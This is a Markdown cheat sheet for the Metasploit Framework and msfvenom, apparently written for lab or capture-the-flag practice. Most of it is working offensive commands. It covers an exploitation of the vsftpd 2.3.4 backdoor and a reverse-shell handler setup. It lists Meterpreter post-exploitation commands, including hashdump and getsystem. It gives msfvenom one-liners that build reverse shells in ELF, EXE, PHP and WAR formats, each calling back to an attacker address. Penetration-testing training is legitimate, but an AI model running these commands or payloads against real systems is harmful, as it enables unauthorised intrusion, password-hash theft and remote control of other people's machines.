# Metasploit Framework & `msfvenom`

> **TL;DR:** Metasploit (`msfconsole`) is an exploitation framework containing thousands of exploits, auxiliary scanners, and post-exploitation modules. `msfvenom` is its standalone payload generator for creating reverse shells in `.exe`, `.elf`, `.php`, `.war`, etc.

---

## Installation & Database Initialization
Pre-installed on Kali Linux. Initialize the database once for faster module searching:
```bash
sudo msfdb init
msfconsole -q
```

---

## Core `msfconsole` Commands Reference

| Command | Description |
|---------|-------------|
| `search <keyword>` | Search modules by CVE, service, or platform (e.g., `search type:exploit eternalblue`) |
| `use <id_or_path>` | Select a module (e.g., `use 0` or `use exploit/multi/handler`) |
| `info` | View module description, affected targets, and references |
| `show options` | List required and optional parameters (`RHOSTS`, `LHOST`, `LPORT`) |
| `set <OPT> <VAL>` | Set an option for the current module (`setg` sets it globally across modules) |
| `show payloads` | List compatible payloads for the selected exploit |
| `check` | Safely test if the target is vulnerable *without* exploiting (when supported) |
| `exploit` / `run` | Execute the module (`run -j` runs it as a background job) |
| `sessions -l` / `sessions -i <id>` | List active shells or interact with session `<id>` (`Ctrl+Z` backgrounds a session) |

## Step-by-Step Practical Workflows

### 1. Exploiting a Service in `msfconsole`
```text
msf6 > search vsftpd 2.3.4
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > set RHOSTS 10.10.10.5
msf6 exploit(...) > run
```

### 2. Catching a Meterpreter Reverse Shell (`multi/handler`)
When delivering a payload generated by `msfvenom` (outside `msfconsole`), start a listener with `exploit/multi/handler`:
```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

### 3. Essential `meterpreter` Post-Exploitation Commands
| Command | Purpose |
|---------|---------|
| `sysinfo` / `getuid` | Show OS details and current user context |
| `getsystem` | Attempt automated privilege escalation |
| `hashdump` | Dump local SAM password hashes (requires SYSTEM/Admin) |
| `upload` / `download` | Transfer files between attacker and target |
| `shell` | Drop into a native OS `cmd.exe` or `/bin/sh` |

### 4. `msfvenom` Standalone Payload Cheatsheet
| Target | Command |
|--------|---------|
| **Linux ELF** | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o rev.elf` |
| **Windows EXE** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o rev.exe` |
| **PHP Web Shell** | `msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -o shell.php` |
| **Java WAR (Tomcat)** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war` |

## Common Pitfalls & Defensive Notes
- **`LHOST` Mismatch:** Always set `LHOST` to your VPN/lab interface IP (e.g., `tun0`), not `127.0.0.1` or your NAT IP.
- **AV/EDR Detection:** Default `msfvenom` binaries are signatured by every modern AV/EDR. Understand them for lab fundamentals, and remember defenders catch them immediately via static signatures and behavioral process-tree rules.
